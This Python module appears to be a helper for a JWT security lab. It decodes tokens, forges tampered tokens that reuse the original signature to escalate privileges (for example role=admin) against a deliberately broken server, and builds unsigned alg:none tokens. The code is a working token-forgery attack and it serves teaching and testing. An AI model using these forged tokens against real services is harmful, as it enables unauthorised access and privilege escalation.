#!/usr/bin/env python3
"""Token editor / helper for the JWT lab.

Lets you inspect a JWT's header and payload, and craft a tampered token that
KEEPS the original signature (the privilege-escalation attack against the broken
server). Also builds an `alg:none` unsigned token, for the negative tests.

This is a convenience so browser-storage quirks don't dominate the task; it does
no signing (you don't have the private key) and no validation.

CLI:
    python -m student.token_editor decode <token>
    python -m student.token_editor tamper <token> --set role=admin --set sub=root
    python -m student.token_editor none   <token> --set role=admin

As a library:
    from student.token_editor import decode, tamper, make_alg_none
"""
from __future__ import annotations

import argparse
import base64
import json


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def decode(token: str) -> dict:
    """Return {'header', 'payload', 'signature_b64url'} without verifying."""
    header_b64, payload_b64, sig_b64 = token.split(".")
    return {
        "header": json.loads(_b64url_decode(header_b64)),
        "payload": json.loads(_b64url_decode(payload_b64)),
        "signature_b64url": sig_b64,
    }


def _coerce(value: str):
    """Turn 'admin'->str, '900'->int, 'true'->bool where it parses as JSON."""
    try:
        return json.loads(value)
    except (ValueError, TypeError):
        return value


def tamper(token: str, changes: dict) -> str:
    """Change payload claims but REUSE the original header and signature.

    Against a server that verifies signatures this is rejected; against the
    broken server it is accepted — that is the whole point of the attack.
    """
    header_b64, _payload_b64, sig_b64 = token.split(".")
    parts = decode(token)
    payload = parts["payload"]
    payload.update(changes)
    new_payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{new_payload_b64}.{sig_b64}"


def make_alg_none(token: str, changes: dict | None = None) -> str:
    """Build an unsigned `alg:none` token (empty signature) from a token's claims."""
    parts = decode(token)
    payload = parts["payload"]
    if changes:
        payload.update(changes)
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def _parse_sets(pairs: list[str]) -> dict:
    out: dict = {}
    for item in pairs or []:
        if "=" not in item:
            raise SystemExit(f"--set expects key=value, got {item!r}")
        k, v = item.split("=", 1)
        out[k] = _coerce(v)
    return out


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="JWT lab token editor")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_dec = sub.add_parser("decode", help="print header + payload")
    p_dec.add_argument("token")

    p_tam = sub.add_parser("tamper", help="edit claims, keep original signature")
    p_tam.add_argument("token")
    p_tam.add_argument("--set", action="append", default=[], dest="sets")

    p_non = sub.add_parser("none", help="build an alg:none unsigned token")
    p_non.add_argument("token")
    p_non.add_argument("--set", action="append", default=[], dest="sets")

    args = ap.parse_args(argv)
    if args.cmd == "decode":
        print(json.dumps(decode(args.token), indent=2))
    elif args.cmd == "tamper":
        print(tamper(args.token, _parse_sets(args.sets)))
    elif args.cmd == "none":
        print(make_alg_none(args.token, _parse_sets(args.sets)))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
